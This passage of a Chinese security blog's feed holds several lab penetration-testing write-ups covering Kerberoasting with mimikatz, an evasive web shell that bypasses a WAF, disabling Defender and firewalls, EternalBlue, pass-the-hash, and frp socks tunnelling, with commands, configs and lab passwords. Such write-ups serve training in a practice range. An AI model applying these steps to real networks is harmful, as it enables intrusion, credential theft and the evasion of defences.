src="https://raw.githubusercontent.com/chencicici/images/main/202210081800493.png"></p><p>上线到cs，这台靶机是不出网的，所以上线就要用到转发上线</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081811400.png"></p><p>成功上线cs，提权到system</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081812473.png"></p><h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现存在域ack123.com，而且存在两张网卡,域控ip 10.10.10.135</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081814882.png"></p><p>域控、域管理员</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081855883.png"></p><h2 id="kerberost攻击域控"><a href="#kerberost攻击域控" class="headerlink" title="kerberost攻击域控"></a>kerberost攻击域控</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Kerberoast攻击共分为五步</span><br><span class="line"><span class="bullet">1.</span>  SPN发现</span><br><span class="line"><span class="bullet">2.</span>  请求服务票据</span><br><span class="line"><span class="bullet">3.</span>  导出服务票据</span><br><span class="line"><span class="bullet">4.</span>  破解服务服务票据</span><br><span class="line"><span class="bullet">5.</span>  重写服务票据</span><br></pre></td></tr></table></figure><p>查询spn服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell setspn -T ack123.com -q */*</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081854824.png"></p><p>创建票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081905241.png"></p><p>列出票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081913306.png"></p><p>切到temp目录导出票据</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081912569.png"></p><p>下载下来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081912705.png"></p><p>使用工具爆破密码<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> </p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081919411.png"></p><p>根据拿到的密码和前面查询到的域管账号进行hash传递</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081922956.png"></p><p>成功上线dc</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081923356.png"></p><p>在用dc1的域管去横向136那台主机，完事！</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081928171.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;此靶场是月师傅九月出师考核靶场，搭建过程参考文章&lt;a href=&quot;https://mp.weixin.qq.com/s/VB4elHdrHNCmPDP_ktcLRg&quot;&gt;红队考核靶场ack123下载和搭建&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;靶场地址：&lt;a href=&quot;https://pan.baidu.com/s/13g_1FFg-ZYYpBwkCvKyYWQ&quot;&gt;https://pan.baidu.com/s/13g_1FFg-ZYYpBwkCvKyYWQ&lt;/a&gt; 提取码：7fkj&lt;/p&gt;
&lt;h2 id=&quot;拓补图&quot;&gt;&lt;a href=&quot;#拓补图&quot; class=&quot;headerlink&quot; title=&quot;拓补图&quot;&gt;&lt;/a&gt;拓补图&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202209281557342.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="免杀" scheme="https://syst1m.top/tags/%E5%85%8D%E6%9D%80/"/>
    
    <category term="过狗" scheme="https://syst1m.top/tags/%E8%BF%87%E7%8B%97/"/>
    
  </entry>
  
  <entry>
    <title>暗月渗透实战靶场项目七</title>
    <link href="https://syst1m.top/2022/09/14/%E6%9A%97%E6%9C%88%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E9%A1%B9%E7%9B%AE%E4%B8%83/"/>
    <id>https://syst1m.top/2022/09/14/%E6%9A%97%E6%9C%88%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E9%A1%B9%E7%9B%AE%E4%B8%83/</id>
    <published>2022-09-14T14:59:49.000Z</published>
    <updated>2022-09-15T16:10:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用的是暗月提供的环境，直接打开虚拟机运行</p><h2 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h2><p>添加两张网卡，web的第一张网卡为桥接模式，需要进入系统修改为自动获取ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151041618.png"></p><h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151043483.png"></p><p>因为防火墙设置，内网是禁ping的，验证方式访问80端口能正常打开就行</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>使用nmap确认靶机ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151107978.png"></p><p>详细扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151125059.png"></p><p>999端口为phpmyadmin，6588为护卫神前台面板</p><p>根据提示，添加一条dns解析</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151131184.png"></p><p>成功访问到</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151132005.png"></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>发现存在安全狗</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151134080.png"></p><p>识别一下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151134241.png"></p><p>存在安全狗的话，扫描速度就要降低，也要降低线程数</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151251191.png"></p><p>最后扫到一个robots.txt</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151259214.png"></p><p>siteserver后台泄露</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151300450.png"></p><h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><h2 id="禁用js找回密码"><a href="#禁用js找回密码" class="headerlink" title="禁用js找回密码"></a>禁用js找回密码</h2><p>通过禁用js，来找回管理员密码</p><p>点击忘记密码输入admin，然后禁用js，点下一步，这里使用的是google的插件Quick Javascript Switcher</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151431725.png"></p><p>之后什么都不用填点下一步，出来密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151428997.png"></p><p>成功登录后台</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151434449.png"></p><h2 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h2><p>在’系统管理’，’站点模版管理’，’导入站点模版’，把我们的过狗aspx的一句话压缩为zip上传到目标模版</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151504537.png"></p><p>这里上传需要注意，我这里直接用冰蝎的免杀shell，其次名字不能为shell.asp这种会被安全狗识别</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151504384.png"></p><p>冰蝎连接 <a href="http://www.moonlab.com/SiteFiles/SiteTemplates/aa/aa.aspx">http://www.moonlab.com/SiteFiles/SiteTemplates/aa/aa.aspx</a>  rebeyond</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151504119.png"></p><p>拿下web主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151506900.png"></p><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现还有一个网段</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151510640.png"></p><p>进程中发现有安全狗</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151512435.png"></p><p>服务中发现存在防火墙和defender</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151514183.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用冰蝎自带的shell转发到msf</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151519635.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151519560.png"></p><p>使用getsystem提权到system</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151520021.png"></p><p>拿到的是一个32位的权限，迁移进程至64系统进程维持权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151650939.png"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="搭建代理隧道"><a href="#搭建代理隧道" class="headerlink" title="搭建代理隧道"></a>搭建代理隧道</h2><p>添加路由</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151522436.png"></p><p>添加socks隧道</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151523345.png"></p><p>proxychains添加一条代理</p><p>socks5 127.0.0.1 1080</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151527087.png"></p><p>测试连通性</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151527249.png"></p><p>也可以上线到cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151625201.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151629920.png"></p><h2 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h2><p>发现由冰蝎上线的cs会掉线，所以用system权限的msf上传一个后门，但是没免杀会被windefend杀掉，命令关不掉windefend，只能抓hash然后打开远程桌面上去手动关掉</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151724755.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151725066.png"></p><p>远程关掉windefend、防火墙，能关的全关了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151909483.png"></p><p>上传cs的后门</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151911208.png"></p><p>转发到smb监听器，在内网更隐蔽</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151912154.png"></p><h2 id="内网OA"><a href="#内网OA" class="headerlink" title="内网OA"></a>内网OA</h2><p>发现一台存活主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152106582.png"></p><p>扫一下端口，只开放了80和5985</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152114893.png"></p><p>浏览器挂个代理再访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152120439.png"></p><p>发现是通达OA</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152121041.png"></p><p>掏出利用工具，也要用porxychains代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152126865.png"></p><p>掏出蚁剑，也要走kali的代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152127029.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152128330.png"></p><p>同样上线到cs，需要中转上线，因为这台OA是不出网的，我们要通过已经拿下的web服务器来转发流量</p><p>选择转发上线</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152139191.png"></p><p>ip地址填能连通OA的那个网卡的ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152138468.png"></p><p>生成后门</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152136140.png"></p><p>通过蚁剑上传运行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152145033.png"></p><p>OA成功上线cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152145055.png"></p><h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现两张网卡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152150249.png"></p><p>而且存在域</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152154075.png"></p><p>抓一下密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152157128.png"></p><p>关闭防火墙</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152202522.png"></p><p>把360也关了，所有防护全部关掉</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152203461.png"></p><p>发现另一网段存活主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152155272.png"></p><p>fscan扫描发现域控，空时存在ms17010</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152222333.png"></p><h2 id="永恒之蓝打DC"><a href="#永恒之蓝打DC" class="headerlink" title="永恒之蓝打DC"></a>永恒之蓝打DC</h2><p>cs起一个代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152253802.png"></p><p>复制到msf中</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152253091.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152254287.png"></p><p>使用正向payload，但是打蓝屏了</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152255119.png"></p><h2 id="pth域横向"><a href="#pth域横向" class="headerlink" title="pth域横向"></a>pth域横向</h2><p>直接横向失败，应该是跟我们改过密码有关系（最开始登录域控要修改密码）</p><p>回到cs，查看进程发现域管理员在线，窃取令牌</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152313539.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152314119.png"></p><p>抓取密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152345522.png"></p><p>解密出来就是我们修改过的密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152348240.png"></p><p>利用刚刚cs搭建的socks4隧道远程登录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152349713.png"></p><p>输入账号密码 attack\administrator  ！@#QWEasd123.</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209152350030.png"></p><p>利用远程桌面复制cs的shell（和上面的转发shell一样的后门），上线cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209160010540.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;使用的是暗月提供的环境，直接打开虚拟机运行&lt;/p&gt;
&lt;h2 id=&quot;网络环境&quot;&gt;&lt;a href=&quot;#网络环境&quot; class=&quot;headerlink&quot; title=&quot;网络环境&quot;&gt;&lt;/a&gt;网络环境&lt;/h2&gt;&lt;p&gt;添加两张网卡，web的第一张网卡为桥接模式，需要进入系统修改为自动获取ip&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202209151041618.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="免杀" scheme="https://syst1m.top/tags/%E5%85%8D%E6%9D%80/"/>
    
    <category term="过狗" scheme="https://syst1m.top/tags/%E8%BF%87%E7%8B%97/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之frp多级代理</title>
    <link href="https://syst1m.top/2022/08/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86/"/>
    <id>https://syst1m.top/2022/08/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%A4%9A%E7%BA%A7%E4%BB%A3%E7%90%86/</id>
    <published>2022-08-30T08:08:37.000Z</published>
    <updated>2022-08-31T11:56:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>攻击机kali，net模式模拟出网：172.16.17.140</p><p>web靶机ubuntu1双网卡，net模式为出网网卡：172.16.17.137&#x2F;自定义网卡vm1模拟第一层内网：192.168.20.129</p><p>内网域内靶机ubuntu2双网卡，vm1网卡在第一层网络：192.168.20.130&#x2F;vm2网卡为第二层内网：192.168.30.129</p><ul><li>外网入口</li></ul><p>172.16.17.0&#x2F;24</p><ul><li>一层内网</li></ul><p>192.168.20.0&#x2F;24</p><ul><li>二层内网</li></ul><p>192.168.30.0&#x2F;24</p><p>每台PC上都有一个web服务，内网主机除边缘win7外全部不出网，内网同<a href="https://so.csdn.net/so/search?q=%E7%BD%91%E6%AE%B5&spm=1001.2101.3001.7020">网段</a>之间的主机可以相互访问,不同网段相互隔离。两个靶机分别开启web服务，区分一下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311837943.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311837382.png"></p><h1 id="一层代理"><a href="#一层代理" class="headerlink" title="一层代理"></a>一层代理</h1><p>假设我们已经拿下边界入口web网站的权限-ubuntu1，上传frp到靶机上对内网进行横向</p><p>攻击机kali配置frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span> <span class="comment">#服务端口</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311849259.png"></p><p>ubuntu1也就是web靶机上配置frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">172.16</span>.<span class="number">17.140</span> <span class="comment">#kali的ip</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span> <span class="comment">#与服务端端口要一致</span></span><br><span class="line"><span class="section">[http_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp <span class="comment">#流量类型</span></span><br><span class="line"><span class="attr">plugin</span> = socks5 <span class="comment">#插件类型</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span> <span class="comment">#代理端口</span></span><br></pre></td></tr></table></figure><p>攻击机kali启动服务端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311856348.png"></p><p>靶机启动客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311902596.png"></p><h2 id="google插件代理"><a href="#google插件代理" class="headerlink" title="google插件代理"></a>google插件代理</h2><p>然后添加代理，我这里用物理机去访问，代理使用的google插件</p><p>ip为kali的ip也就是服务端，端口为客户端的代理端口6000截图的时候写错了，访问192.168.20.0&#x2F;24</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311911264.png"></p><p>成功代理到192.168.20&#x2F;24网段</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311914958.png"></p><h2 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h2><p>用kali自带的proxychains去代理，添加一条，所有工具都可以使用proxychains代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 6000</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311925449.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311925504.png"></p><h1 id="二层代理"><a href="#二层代理" class="headerlink" title="二层代理"></a>二层代理</h1><p>假设我们现在通过一层代理，可以访问到20网段的所有资产，然后我们发现存在一台不出网的主机，192.168.20.130，也就是域内靶机-ubuntu2，然后我们拿下权限之后发现还存在192.168.30.0&#x2F;24网段，现在我们需要代理到30网段去继续横向拿域控</p><p>一层代理不要掉，在kali上配置frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span><span class="attr">bind_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7788</span></span><br></pre></td></tr></table></figure><p>启动</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311943595.png"></p><p>边界靶机ubuntu1上配置frps.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">192.168</span>.<span class="number">20.129</span>  </span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7799</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311945905.png"></p><p>边界靶机ubuntu1上t同时配置frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">172.16</span>.<span class="number">17.140</span> </span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7788</span>  </span><br><span class="line"><span class="section">[http_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">192.168</span>.<span class="number">130.129</span> </span><br><span class="line"><span class="attr">local_port</span> = <span class="number">1080</span>    </span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">1080</span>  </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311944622.png"></p><p>同样上传frp到域内靶机-ubuntu2上，配置frpc.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">20.129</span> </span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7799</span>        </span><br><span class="line"><span class="section">[http_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">1080</span> </span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br></pre></td></tr></table></figure><p>启动</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311946846.png"></p><p>加上代理访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311956560.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208311950709.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;攻击机kali，net模式模拟出网：172.16.17.140&lt;/p&gt;
&lt;p&gt;web靶机ubuntu1双网卡，net模式为出网网卡：172.16.17.137&amp;#x2F;自定义网卡vm1模拟第一层内网：192.168.20.129&lt;/p&gt;
&lt;p&gt;内网域内靶机ubuntu2双网卡，vm1网卡在第一层网络：192.168.20.130&amp;#x2F;vm2网卡为第二层内网：192.168.30.129&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;外网入口&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="工具使用" scheme="https://syst1m.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="frp" scheme="https://syst1m.top/tags/frp/"/>
    
  </entry>
  
  <entry>
    <title>ATT-CK红队实战靶场07</title>
    <link href="https://syst1m.top/2022/08/25/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA07/"/>
    <id>https://syst1m.top/2022/08/25/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA07/</id>
    <published>2022-08-25T08:53:52.000Z</published>
    <updated>2022-10-21T06:09:02.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>整个靶场环境一共五个靶机（总共27.8 GB），分别位于三层网络环境中：</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251702067.png"></p><ul><li><p>DMZ区IP段为192.168.1.1&#x2F;24 复制物理机网络</p></li><li><p>第二层网络环境IP段为192.168.52.1&#x2F;24</p></li><li><p>第三层网络环境IP段为192.168.93.1&#x2F;24</p></li></ul><h2 id="网络设置"><a href="#网络设置" class="headerlink" title="网络设置"></a>网络设置</h2><p>在Vmware中新增两个虚拟网卡VMnet8、VMnet14。VMnet8设为默认的NAT模式，IP段设为</p><p>192.168.52.0&#x2F;24；VMnet14设为仅主机模式，IP段设为192.168.93.0&#x2F;24：</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251704032.png"></p><p>将VMnet8作为第二层网络的网卡，VMnet14作为第三层网络的网卡。这样，第二层网络中的所有主机</p><p>皆可以上网，但是位于第三层网络中的所有主机都不与外网相连通，不能上网。</p><p><strong>DMZ区域：</strong></p><p>给Ubuntu (Web 1) 配置了两个网卡，一个桥接可以对外提供服务；一个连接在VMnet8上连通第二</p><p>层网络。</p><p><strong>第二层网络区域：</strong></p><p>给Ubuntu (Web 2) 和Windows 7 (PC 1)都配置了两个网卡，一个连接在VMnet8上连通第二层网</p><p>络，一个连接在VMnet14上连通第三层网络。</p><p><strong>第三次网络区域：</strong></p><p>给Windows Server 2012和Windows 7 (PC 2)都只配置了一个网卡，一个连接在VMnet14上连通第</p><p>三层网络。</p><h2 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h2><p>靶场中各个主机都运行着相应的服务并且没有自启功能，如果你关闭了靶机，再次启动时还需要在相应</p><p>的主机上启动靶机服务（有的需要加上sudo执行）：</p><p><strong>DMZ区的Ubuntu需要启动nginx服务：</strong></p><p>redis-server &#x2F;etc&#x2F;redis.conf</p><p>&#x2F;usr&#x2F;sbin&#x2F;nginx -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>iptables -F</p><p><strong>第二层网络的Ubuntu需要启动docker容器：</strong></p><p>sudo service docker start</p><p>sudo docker start 8e172820ac78</p><p><strong>第三层网络的Windows 7PC 2）需要启动通达OA：</strong></p><p>C:\MYOA\bin\AutoConfig.exe</p><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><p>**域用户账户和密码如下 **：</p><p>Administrator：Whoami2021</p><p>whoami：Whoami2021</p><p>bunny：Bunny2021</p><p>moretz：Moretz2021</p><p>**Ubuntu 1 **：</p><p>web：web2021</p><p>**Ubuntu 2 **：</p><p>ubuntu：ubuntu</p><p>**通达OA账户 **：</p><p>admin：admin657260</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>对dmz靶机进行端口扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208251721607.png"></p><p>22端口：ssh，基本不考虑爆破</p><p>80,81端口：访问一个404一个502不知道是不是我环境搭建有问题</p><p>6379端口：redis未授权访问</p><h2 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h2><p>尝试连接，发现存在redis未授权访问</p><p><img 